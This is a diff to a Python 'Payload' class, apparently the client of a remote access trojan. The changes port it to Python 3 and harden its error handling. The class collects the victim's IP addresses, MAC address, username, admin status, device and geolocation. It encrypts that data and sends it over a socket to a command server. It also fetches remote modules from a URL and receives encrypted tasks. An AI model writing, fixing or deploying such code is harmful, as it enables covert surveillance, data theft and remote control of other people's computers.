@@ -144,28 +144,34 @@ class Payload():
 
 
     def _get_info(self):
-        info = {}
-        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
-            try:
-                info[function] = globals()[function]()
-                if isinstance(info[function], bytes):
-                    info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
-            except Exception as e:
-                log("{} returned error: {}".format(function, str(e)))
+        try:
+            info = {}
+            for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+                try:
+                    info[function] = globals()[function]()
+                    if isinstance(info[function], bytes):
+                        info[function] = "_b64__" + base64.b64encode(info[function]).decode('utf-8')
+                except Exception as e:
+                    log("{} returned error: {}".format(function, str(e)))
 
-        # add owner of session for web application
-        info['owner'] = "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('ascii')
+            # add owner of session for web application
+            info['owner'] = "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('utf-8')
 
-        # add geolocation of host machine
-        latitude, longitude = globals()['geolocation']()
-        info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
-        info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')
+            # add geolocation of host machine
+            latitude, longitude = globals()['geolocation']()
+            info['latitude'] = "_b64__" + base64.b64encode(str(latitude).encode('utf-8')).decode('utf-8')
+            info['longitude'] = "_b64__" + base64.b64encode(str(longitude).encode('utf-8')).decode('utf-8')
 
-        # encrypt and send data to server
-        data = globals()['encrypt_aes'](json.dumps(info), self.key)
-        msg = struct.pack('!L', len(data)) + data
-        self.connection.sendall(msg)
-        return info
+            # encrypt and send data to server
+            data = globals()['encrypt_aes'](json.dumps(info), self.key)
+            msg = struct.pack('!L', len(data)) + data
+            self.connection.sendall(msg)
+            return info
+        except Exception as e:
+            import traceback
+            print(f"Get info error: {str(e)}")
+            traceback.print_exc()
+            return {}
 
     @threaded
     def _get_resources(self, target=None, base_url=None):
@@ -177,11 +183,13 @@ class Payload():
             if not base_url.startswith('http'):
                 raise ValueError("keyword argument 'base_url' must start with http:// or https://")
             log('[*] Searching %s' % base_url)
-            path = urlparse.urlsplit(base_url).path
+            from urllib.parse import urlsplit
+            path = urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
             names = []
             for line in urlopen(base_url).read().splitlines():
-                line = str(line)
+                if isinstance(line, bytes):
+                    line = line.decode('utf-8')
                 if 'href' in line and '</a>' in line and '__init__.py' not in line:
                     names.append(line.rpartition('</a>')[0].rpartition('>')[2].strip('/'))
             for n in names:
@@ -995,7 +1003,6 @@ class Payload():
             else:
                 log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
             self.passive()
-            #log("{} error: {}".format(self.send_task.__name__, str(e)))
 
 
     def recv_task(self):
@@ -1018,6 +1025,8 @@ class Payload():
                 msg_len = struct.unpack('!L', hdr)[0]
                 msg = self.connection.recv(msg_len)
                 data = globals()['decrypt_aes'](msg, self.key)
+                if isinstance(data, bytes):
+                    data = data.decode('utf-8')
                 return json.loads(data)
             else:
                 log("{} error: invalid header length".format(self.recv_task.__name__))
@@ -1036,7 +1045,6 @@ class Payload():
             else:
                 log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.recv_task.__name__, e))    
             self.passive()
-            #log("{} error: {}".format(self.recv_task.__name__, str(e)))
 
 
     def run(self):
